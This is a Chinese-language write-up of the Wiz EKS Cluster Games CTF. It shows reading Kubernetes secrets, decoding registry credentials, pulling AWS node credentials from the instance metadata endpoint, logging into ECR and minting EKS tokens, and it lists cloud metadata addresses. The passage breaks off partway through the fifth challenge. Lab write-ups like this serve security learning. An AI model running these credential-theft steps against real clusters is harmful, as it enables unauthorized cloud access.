

# 从EKS CLUSTER GAMES看云原生安全 - 先知社区

从EKS CLUSTER GAMES看云原生安全

- - -

最近WIZ弄了一个云原生的安全挑战赛，刚出来的时候就已经打通关了，年底比较忙，一直没时间写篇文章记录下整个过程，发现这个挑战赛实在是太经典了，所以还是决定写篇文章记录下，顺便谈谈我从中学到的东西和感悟。

靶场地址：[https://eksclustergames.com/](https://eksclustergames.com/)

## 前言

靶场的环境是假设你入侵了一个低权限的AWS EKS Pod，在pod中寻找Flag，每个挑战都在具有不同权限的不同 Kubernetes 命名空间中运行，一共有5个关卡。

## 一、Secret Seeker

> Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?

```plain
{
    "secrets": [
        "get",
        "list"
    ]
}
```

这道题给出了对应的权限，发现secrets有`get`和`list`权限，那我们就尝试读取一下。

```plain
root@wiz-eks-challenge:~# kubectl get secrets log-rotate -o yaml
apiVersion: v1
data:
  flag: d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==
kind: Secret
metadata:
  creationTimestamp: "2023-11-01T13:02:08Z"
  name: log-rotate
  namespace: challenge1
  resourceVersion: "890951"
  uid: 03f6372c-b728-4c5b-ad28-70d5af8d387c
type: Opaque
```

我们可以轻松读取到`log-rotate`这里面有flag，经过Base64解码后就能得到真正的Flag。

> wiz\_eks\_challenge{omg\_over\_privileged\_secret\_access}

这题的考点就是在K8s的secret上，secret用来保存敏感数据，例如密码，token，或者秘钥，这类数据可以存放在Pod或者镜像中，但是放在Secret中是为了更方便的控制如何使用数据，并减少暴露的风险。

但是如果没有做好权限控制，攻击者就可能从secret中获取到敏感信息，更重要的一点是，Secret中使用Base64编码并不安全。

## 二、Registry Hunt

> A thing we learned during our research: always check the container registries.
> 
> For your convenience, the [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.

```plain
{
    "secrets": [
        "get"
    ],
    "pods": [
        "list",
        "get"
    ]
}
```

如果说第一题是签到题，那么第二题就开始有些难度了，在这个权限下，我们没有办法像第一题那样去列出secrets，但是给了我们pods部分权限。  
[![](assets/1703209910-01df5f65d10c0ba3dd65fe1c4c3cb8a9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165351-76b2ab9e-9fde-1.png)  
（图1：无法列出secrets）  
那我们先看看pod里都有些什么？

```plain
root@wiz-eks-challenge:~# kubectl get pods -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubernetes.io/psp: eks.privileged
      pulumi.com/autonamed: "true"
    creationTimestamp: "2023-11-01T13:32:05Z"
    name: database-pod-2c9b3a4e
    namespace: challenge2
    resourceVersion: "12166896"
    uid: 57fe7d43-5eb3-4554-98da-47340d94b4a6
  spec:
    containers:
    - image: eksclustergames/base_ext_image
      imagePullPolicy: Always
      name: my-container
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-cq4m2
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    imagePullSecrets:
    - name: registry-pull-secrets-780bab1d
    nodeName: ip-192-168-21-50.us-west-1.compute.internal
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: default
    serviceAccountName: default
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - name: kube-api-access-cq4m2
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:05Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2023-12-07T19:54:26Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2023-12-07T19:54:26Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:05Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: containerd://8010fe76a2bcad0d49b7d810efd7afdecdf00815a9f5197b651b26ddc5de1eb0
      image: docker.io/eksclustergames/base_ext_image:latest
      imageID: docker.io/eksclustergames/base_ext_image@sha256:a17a9428af1cc25f2158dfba0fe3662cad25b7627b09bf24a915a70831d82623
      lastState:
        terminated:
          containerID: containerd://b427307b7f428bcf6a50bb40ebef194ba358f77dbdb3e7025f46be02b922f5af
          exitCode: 0
          finishedAt: "2023-12-07T19:54:25Z"
          reason: Completed
          startedAt: "2023-11-01T13:32:08Z"
      name: my-container
      ready: true
      restartCount: 1
      started: true
      state:
        running:
          startedAt: "2023-12-07T19:54:26Z"
    hostIP: 192.168.21.50
    phase: Running
    podIP: 192.168.12.173
    podIPs:
    - ip: 192.168.12.173
    qosClass: BestEffort
    startTime: "2023-11-01T13:32:05Z"
kind: List
metadata:
  resourceVersion: ""
```

这里我们关注的点在`imagePullSecrets`，`imagePullSecrets`是用于在Kubernetes集群中拉取私有Docker镜像的一种机制。在Kubernetes中，Pods可以通过`imagePullSecrets`配置项指定一个或多个用于身份验证的凭据，以访问私有的Docker镜像仓库。这对于需要访问私有镜像的场景非常有用，因为它允许Kubernetes集群中的Pods在从私有仓库拉取镜像时提供必要的凭据。

`imagePullSecrets`通常包含一个或多个Docker Registry的凭据，包括用户名、密码等信息。这些凭据被加密存储在Kubernetes集群中，并在Pods启动时自动注入到相应的容器中，以便访问需要身份验证的私有镜像。

说简单点就是，我还是可以读取到`registry`、`username` 和`password` ，这些用于拉取镜像的信息。

```plain
root@wiz-eks-challenge:~# kubectl get secret registry-pull-secrets-780bab1d  --namespace=challenge2 -o json
{
    "apiVersion": "v1",
    "data": {
        ".dockerconfigjson": "eyJhdXRocyI6IHsiaW5kZXguZG9ja2VyLmlvL3YxLyI6IHsiYXV0aCI6ICJaV3R6WTJ4MWMzUmxjbWRoYldWek9tUmphM0pmY0dGMFgxbDBibU5XTFZJNE5XMUhOMjAwYkhJME5XbFpVV280Um5WRGJ3PT0ifX19"
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "pulumi.com/autonamed": "true"
        },
        "creationTimestamp": "2023-11-01T13:31:29Z",
        "name": "registry-pull-secrets-780bab1d",
        "namespace": "challenge2",
        "resourceVersion": "897340",
        "uid": "1348531e-57ff-42df-b074-d9ecd566e18b"
    },
    "type": "kubernetes.io/dockerconfigjson"
}
```

我们将得到的`.dockerconfigjson`进行base64解码。

```plain
{"auths": {"index.docker.io/v1/": {"auth": "ZWtzY2x1c3RlcmdhbWVzOmRja3JfcGF0X1l0bmNWLVI4NW1HN200bHI0NWlZUWo4RnVDbw=="}}}
```

我们再进行二次Base64解码。

```plain
eksclustergames:dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
```

至此，我们拿到了`registry`、`username` 和`password`，题目提示我们已经装好了`crane`，那看来我们的思路没有错，我们直接拿凭据登录。

```plain
crane auth login index.docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo
```

提示登录成功，然后我们使用`crane config`信息查看镜像信息，直接发现Flag。

```plain
root@wiz-eks-challenge:~# crane config eksclustergames/base_ext_image:latest
{"architecture":"amd64","config":{"Env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],"Cmd":["/bin/sleep","3133337"],"ArgsEscaped":true,"OnBuild":null},"created":"2023-11-01T13:32:18.920734382Z","history":[{"created":"2023-07-18T23:19:33.538571854Z","created_by":"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "},{"created":"2023-07-18T23:19:33.655005962Z","created_by":"/bin/sh -c #(nop)  CMD [\"sh\"]","empty_layer":true},{"created":"2023-11-01T13:32:18.920734382Z","created_by":"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_be_certain_except_death_taxes_and_the_exisitense_of_misconfigured_imagepullsecret}' \u003e /flag.txt # buildkit","comment":"buildkit.dockerfile.v0"},{"created":"2023-11-01T13:32:18.920734382Z","created_by":"CMD [\"/bin/sleep\" \"3133337\"]","comment":"buildkit.dockerfile.v0","empty_layer":true}],"os":"linux","rootfs":{"type":"layers","diff_ids":["sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f","sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"]}}
```

> wiz\_eks\_challenge{nothing\_can\_be\_said\_to\_be\_certain\_except\_death\_taxes\_and\_the\_exisitense\_of\_misconfigured\_imagepullsecret}

这里值得一提的是，这道题是之前阿里云和IBM云中的跨租户未经授权访问漏洞的真实案例改编而来，过程远比这个复杂，但是思路是一样的，有兴趣可以延伸阅读，相关地址如下：

> [https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r](https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r)
> 
> [https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)

## 三、Image Inquisition

> A pod's image holds more than just code. Dive deep into its ECR repository, inspect the image layers, and uncover the hidden secret.
> 
> Remember: You are running inside a compromised EKS pod.
> 
> For your convenience, the [crane](https://github.com/google/go-containerregistry/blob/main/cmd/crane/doc/crane.md) utility is already pre-installed on the machine.

```plain
{
    "pods": [
        "list",
        "get"
    ]
}
```

这道题算是`Registry Hunt`的升级，这里直接没有给`secrets`的权限了，只有`pod`的权限，先走一遍流程，看一下pod里都有什么。

```plain
root@wiz-eks-challenge:~# kubectl get pods -o yaml
apiVersion: v1
items:
- apiVersion: v1
  kind: Pod
  metadata:
    annotations:
      kubernetes.io/psp: eks.privileged
      pulumi.com/autonamed: "true"
    creationTimestamp: "2023-11-01T13:32:10Z"
    name: accounting-pod-876647f8
    namespace: challenge3
    resourceVersion: "12166911"
    uid: dd2256ae-26ca-4b94-a4bf-4ac1768a54e2
  spec:
    containers:
    - image: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
      imagePullPolicy: IfNotPresent
      name: accounting-container
      resources: {}
      terminationMessagePath: /dev/termination-log
      terminationMessagePolicy: File
      volumeMounts:
      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
        name: kube-api-access-mmvjj
        readOnly: true
    dnsPolicy: ClusterFirst
    enableServiceLinks: true
    nodeName: ip-192-168-21-50.us-west-1.compute.internal
    preemptionPolicy: PreemptLowerPriority
    priority: 0
    restartPolicy: Always
    schedulerName: default-scheduler
    securityContext: {}
    serviceAccount: default
    serviceAccountName: default
    terminationGracePeriodSeconds: 30
    tolerations:
    - effect: NoExecute
      key: node.kubernetes.io/not-ready
      operator: Exists
      tolerationSeconds: 300
    - effect: NoExecute
      key: node.kubernetes.io/unreachable
      operator: Exists
      tolerationSeconds: 300
    volumes:
    - name: kube-api-access-mmvjj
      projected:
        defaultMode: 420
        sources:
        - serviceAccountToken:
            expirationSeconds: 3607
            path: token
        - configMap:
            items:
            - key: ca.crt
              path: ca.crt
            name: kube-root-ca.crt
        - downwardAPI:
            items:
            - fieldRef:
                apiVersion: v1
                fieldPath: metadata.namespace
              path: namespace
  status:
    conditions:
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:10Z"
      status: "True"
      type: Initialized
    - lastProbeTime: null
      lastTransitionTime: "2023-12-07T19:54:29Z"
      status: "True"
      type: Ready
    - lastProbeTime: null
      lastTransitionTime: "2023-12-07T19:54:29Z"
      status: "True"
      type: ContainersReady
    - lastProbeTime: null
      lastTransitionTime: "2023-11-01T13:32:10Z"
      status: "True"
      type: PodScheduled
    containerStatuses:
    - containerID: containerd://665178aaf28ddd6d73bf88958605be9851e03eed9c1e61f1a1176a69719191f2
      image: sha256:575a75bed1bdcf83fba40e82c30a7eec7bc758645830332a38cef238cd4cf0f3
      imageID: 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01
      lastState:
        terminated:
          containerID: containerd://c465d5104e6f4cac49da0b7495eb2f7c251770f8bf3ce4a1096cf5c704b9ebbe
          exitCode: 0
          finishedAt: "2023-12-07T19:54:28Z"
          reason: Completed
          startedAt: "2023-11-01T13:32:11Z"
      name: accounting-container
      ready: true
      restartCount: 1
      started: true
      state:
        running:
          startedAt: "2023-12-07T19:54:29Z"
    hostIP: 192.168.21.50
    phase: Running
    podIP: 192.168.5.251
    podIPs:
    - ip: 192.168.5.251
    qosClass: BestEffort
    startTime: "2023-11-01T13:32:10Z"
kind: List
metadata:
  resourceVersion: ""
```

这里我们看到`registry`从`docker.io`变为了`688655246681.dkr.ecr.us-west-1.amazonaws.com`，题目也提示是ECR，那就要想办法获取ECR的凭据了。

> Amazon ECR是亚马逊提供的一种容器镜像注册表服务，用于存储、管理和部署Docker容器镜像

那我们根据pod中的信息获取到了`imageID`，我们就尝试读取一下试试？  
[![](assets/1703209910-d99676bdc405724441d8549c89679701.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165423-89d7b930-9fde-1.png)  
（图2：没有权限读取）

既然在EKS环境，而EKS又在AWS云上，首先想到去读一下元数据。

```plain
root@wiz-eks-challenge:~# curl http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   523  100   523    0     0   1305      0 --:--:-- --:--:-- --:--:--  1307
{
  "AccessKeyId": "ASIA2AVYNEVMQNCHP4P5",
  "Expiration": "2023-12-20 19:37:52+00:00",
  "SecretAccessKey": "a+2FDCofUYQrvZUHKdPUMP4RxMNmdjYpqwC1En6M",
  "SessionToken": "FwoGZXIvYXdzEIz//////////wEaDHPb3drwbsRH6wtA8iK3AYqcQSLmfiCu+hmW1eM95tlxfRsoafosQ2MZnD7on00gABGFbWJhsmkSM9IRF4zWKWPG7nlwrjXxqYqGAVV/CPmQK0iz5MJR4txRB7rin1hH6ivhgZjZY7yq0f+/uv9TX2Cv95RtzVh9+Azhrp20BSqthD+Lu3p1NVPl6mLcb8khsvrWV2KjSUEPb/OFFnOSMjFCJXKFvHWtaOz3nQQV/gjb8RKUQkXPq01ai6JifG6sUW6cxI/gWSin9IysBjIt2shS4nrklWwSBsTQ6URY/jsdVK+F+/XJGq4uOwQCJttz0wN8ZZ1w5pjgBmMi"
}
```

[![](assets/1703209910-5d9cb71bed7e8a986d6f9d7a74c95432.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165448-9887e8d8-9fde-1.png)  
（图3：通过元数据地址读取到AWS的AK/SK）

接着我们继续使用拿到的AK/SK作为

```plain
crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u ASIA2AVYNEVMVEC2UXYI -p vhBR/+x6wQ3hssszPxN1aHve6MIokbGF9SxZycYG
```

很显然不能这样登录，阅读了[ECR的文档](https://docs.aws.amazon.com/cli/latest/reference/ecr/get-login-password.html)后发现，需要先用aws-cli获取一下，经过测试后发现，环境里正好有aws-cli环境，所以就直接利用aws-cli命令登录ECR。

```plain
root@wiz-eks-challenge:~# export AWS_ACCESS_KEY_ID=ASIA2AVYNEVMQNCHP4P5
root@wiz-eks-challenge:~# export AWS_SECRET_ACCESS_KEY=a+2FDCofUYQrvZUHKdPUMP4RxMNmdjYpqwC1En6M
export root@wiz-eks-challenge:~# AWS_SESSION_TOKEN=FwoGZXIvYXdzEIz//////////wEaDHPb3drwbsRH6wtA8iK3AYqcQSLmfiCu+hmW1eM95tlxfRsoafosQ2MZnD7on00gABGFbWJhsmkSM9IRF4zWKWPG7nlwrjXxqYqGAVV/CPmQK0iz5MJR4txRB7rin1hH6ivhgZjZY7yq0f+/uv9TX2Cv95RtzVh9+Azhrp20BSqthD+Lu3p1NVPl6mLcb8khsvrWV2KjSUEPb/OFFnOSMjFCJXKFvHWtaOz3nQQV/gjb8RKUQkXPq01ai6JifG6sUW6cxI/gWSin9IysBjIt2shS4nrklWwSBsTQ6URY/jsdVK+F+/XJGq4uOwQCJttz0wN8ZZ1w5pjgBmMi

root@wiz-eks-challenge:~# aws ecr get-login-password|crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u AWS --password-stdin
2023/12/20 19:06:36 logged in via /home/user/.docker/config.json

root@wiz-eks-challenge:~# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq
{
  "architecture": "amd64",
  "config": {
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
    ],
    "Cmd": [
      "/bin/sleep",
      "3133337"
    ],
    "ArgsEscaped": true,
    "OnBuild": null
  },
  "created": "2023-11-01T13:32:07.782534085Z",
  "history": [
    {
      "created": "2023-07-18T23:19:33.538571854Z",
      "created_by": "/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "
    },
    {
      "created": "2023-07-18T23:19:33.655005962Z",
      "created_by": "/bin/sh -c #(nop)  CMD [\"sh\"]",
      "empty_layer": true
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal_the_secrets_to_the_future} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit",
      "comment": "buildkit.dockerfile.v0"
    },
    {
      "created": "2023-11-01T13:32:07.782534085Z",
      "created_by": "CMD [\"/bin/sleep\" \"3133337\"]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    }
  ],
  "os": "linux",
  "rootfs": {
    "type": "layers",
    "diff_ids": [
      "sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f",
      "sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"
    ]
  }
}
```

[![](assets/1703209910-e414b346d68c2f5299d9b3dd2d771232.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165553-bf43af52-9fde-1.png)  
（图4：通过读取config信息获取到Flag）

> wiz\_eks\_challenge{the\_history\_of\_container\_images\_could\_reveal\_the\_secrets\_to\_the\_future}

这道题其实就是常规的AK/SK利用手法，熟悉公有云攻防的小伙伴们应该都不陌生，同时这也是公有云上后渗透的常规思路，以下是常见的公有云厂商的元数据地址：

```plain
#AWS
http://instance-data
http://169.254.169.254
#Google Cloud
http://169.254.169.254
http://metadata.google.internal
http://metadata
#Azure
http://169.254.169.254
#Digital Ocean
http://169.254.169.254
#Packetcloud
https://metadata.packet.net
#Oracle Cloud
http://169.254.169.254
#Alibaba Cloud
http://100.100.100.200
#Tencent Cloud
http://metadata.tencentyun.com
http://169.254.0.23
```

## 四、Pod Break

> You're inside a vulnerable pod on an EKS cluster. Your pod's service-account has no permissions. Can you navigate your way to access the EKS Node's privileged service-account?
> 
> Please be aware: Due to security considerations aimed at safeguarding the CTF infrastructure, the node has restricted permissions

这题告诉我们已经在EKS集群内的pod内了，并且所在的pod的服务账户没有权限，要我接管EKS。

首先先获取当前 AWS 身份的信息，

```plain
root@wiz-eks-challenge:~# aws sts get-caller-identity
{
    "UserId": "AROA2AVYNEVMQ3Z5GHZHS:i-0cb922c6673973282",
    "Account": "688655246681",
    "Arn": "arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"
}
```

这里我们可以看到Arn信息，从中我们能得知很多信息，通过查阅AWS-CLI文档关于EKS的部分，发现有个`get-token`的选项，我们尝试一下。

```plain
aws eks get-token --cluster-name <你的集群名称> > eks-token.json
```

这里有一个坑点，我找不到集群名称，一开始我打算使用`aws eks list-clusters`列出集群名称，但是发现没有权限，后面随便盲猜发现`eks-challenge-cluster`可列出。

```plain
aws eks get-token --cluster-name eks-challenge-cluster
```

但是我又随便尝试了`123`也可以列出，经过后续测试发现列出的token是无法利用的。

```plain
aws eks get-token --cluster-name eks-challenge-cluster
```

[![](assets/1703209910-4bb69602e6a7658b4b4d9aa13828629b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165710-ed0a6192-9fde-1.png)  
（图5：成功获取了eks的token，这里虽然获取到了，但是其实是无法利用的）

我们重新获取`eks-challenge-cluster`的token，我们继续利用：

```plain
kubectl auth can-i --list --token="k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk01Nkw1SDJYSyUyRjIwMjMxMjIxJTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzEyMjFUMDYyMzEzWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFSmolMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFETUpKY3RHT0xRT1JTVmp6WFNLM0FlbXpLJTJCcEtHNmFXQ2J4JTJGYUtVc0dma3FqUGdDdXZ3a2szVjY1eTFMYTBCNEFEdFRabk1IZ2NIRWd1JTJGM1YlMkJJakFSWVEwOUh0YWI1SFdHWXN3R2FOc01jbCUyRmJKUDJhcXBJMFZKTHA1UElxSTBMb1R1OFp5ZiUyRlJOUmZVSktyQWlxVnYlMkY0MnptTzJTdlBGRUtXVmkwaG5rUW45c01yWFBXWG5UbFYweXJoT0FucnZNZUZsR0FxR21YNiUyQm00RmEwUHQ5ZjkzMGlQMXZwMnVYZ1dBOFRmaEt5dnBMSENVMiUyQllKODZWdEVHWkU5cUp4SUVkeFk1aGx6U2pzcTQlMkJzQmpJdFdGJTJGNUVXZlRMOFk3SjMxUSUyQkMzZHZXVGc3Wm56JTJGQ2VwNE1KJTJGTTVobVlmSUJJJTJCV2Vaa21ncWJTR2F5TlcmWC1BbXotU2lnbmF0dXJlPWYwMDVmYzdhZmU5NWVjZWVmMjcwNWNiN2YzNzVhMzkzNGIyNjlkZjY0MTBmODUwZTU0ZTVmZDE2YWQ1NGFkOWY"
```

[![](assets/1703209910-9f4bf50ca85371bdf2be08ae14cb4055.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165722-f47ac048-9fde-1.png)  
（图6：成功列举权限）

```plain
kubectl get secrets -o yaml --token="k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk01Nkw1SDJYSyUyRjIwMjMxMjIxJTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyMzEyMjFUMDYyMzEzWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFSmolMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFETUpKY3RHT0xRT1JTVmp6WFNLM0FlbXpLJTJCcEtHNmFXQ2J4JTJGYUtVc0dma3FqUGdDdXZ3a2szVjY1eTFMYTBCNEFEdFRabk1IZ2NIRWd1JTJGM1YlMkJJakFSWVEwOUh0YWI1SFdHWXN3R2FOc01jbCUyRmJKUDJhcXBJMFZKTHA1UElxSTBMb1R1OFp5ZiUyRlJOUmZVSktyQWlxVnYlMkY0MnptTzJTdlBGRUtXVmkwaG5rUW45c01yWFBXWG5UbFYweXJoT0FucnZNZUZsR0FxR21YNiUyQm00RmEwUHQ5ZjkzMGlQMXZwMnVYZ1dBOFRmaEt5dnBMSENVMiUyQllKODZWdEVHWkU5cUp4SUVkeFk1aGx6U2pzcTQlMkJzQmpJdFdGJTJGNUVXZlRMOFk3SjMxUSUyQkMzZHZXVGc3Wm56JTJGQ2VwNE1KJTJGTTVobVlmSUJJJTJCV2Vaa21ncWJTR2F5TlcmWC1BbXotU2lnbmF0dXJlPWYwMDVmYzdhZmU5NWVjZWVmMjcwNWNiN2YzNzVhMzkzNGIyNjlkZjY0MTBmODUwZTU0ZTVmZDE2YWQ1NGFkOWY"
```

[![](assets/1703209910-53687c926c678c4fcc34feeebcbd6d05.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165740-ff38488e-9fde-1.png)  
（图7：获取到secrets中的Flag）

可以看到轻松获取到Flag

> wiz\_eks\_challenge{only\_a\_real\_pro\_can\_navigate\_IMDS\_to\_EKS\_congrats}

这道题目其实就是考察对AWS元数据以及EKS的后利用，这个配置错误在现实生活中非常常见，由于需要题目需要，所以这里其实对权限做了很多限制，现实生活中权限往往更大。

## 五、Container Secrets Infrastructure

> You've successfully transitioned from a limited Service Account to a Node Service Account! Great job. Your next challenge is to move from the EKS to the AWS account. Can you acquire the AWS role of the *s3access-sa* service account, and get the flag?

IAM Policy

```plain
{
    "Policy": {
        "Statement": [
            {
                "Action": [
                    "s3:GetObject",
                    "s3:ListBucket"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2",
                    "arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"
                ]
            }
        ],
        "Version": "2012-10-17"
    }
}
```

Trust Policy

```plain
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "Federated": "arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"
            },
            "Action": "sts:AssumeRoleWithWebIdentity",
            "Condition": {
                "StringEquals": {
                    "oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud": "sts.amazonaws.com"
                }
            }
        }
    ]
}
```

Permissions

```plain
{
    "secrets": [
        "get",
        "list"
    ],
    "serviceaccounts": [
        "get",
        "list"
    ],
    "pods": [
        "get",
        "list"
    ],
    "serviceaccounts/token": [
        "create"
    ]
}
```

通过题目说明得知这次是要求我们从EKS提升到AWS权限，这其实就是第四题的进一步利用，第四题我们从受限的服务帐户提升到节点服务帐户。并且从给出的`IAM Policy`可以看到Flag就在S3的存储桶里，那么这时候我们的思路就是如何生成一个aws令牌。

并且还给出了一个我没见过的`OIDC`服务，我们先去看下官方文档是怎么说的：

> AWS的OpenID Connect (OIDC) 是一种身份验证协议，它允许您使用第三方身份提供商（如 Google、Facebook 或企业身份系统）来认证用户。在AWS中，您可以创建一个OIDC身份提供商，然后利用这个提供商来授予AWS资源的访问权限。

那我们的思路就非常明朗了，利用OIDC服务去创建AWS的令牌。

[![](assets/1703209910-666c76556d8e52bbe1c27fe32dc568af.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165754-075eadbe-9fdf-1.png)  
（图8：ChatGPT关于OIDC服务的描述）

我们先看kubectl的权限情况，还是跟题4一样的权限，不同的是这时候secrets里就没有Flag了，我们看到可以创建`serviceaccounts/token`，那就创建个token试试看。

[![](assets/1703209910-651d3e8f60f8da9c80d30ee24b0daa93.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165824-192a4b2a-9fdf-1.png)  
（图9：查看权限）

创建出来的token如下

```plain
root@wiz-eks-challenge:~#  kubectl create token debug-sa --token="省略"
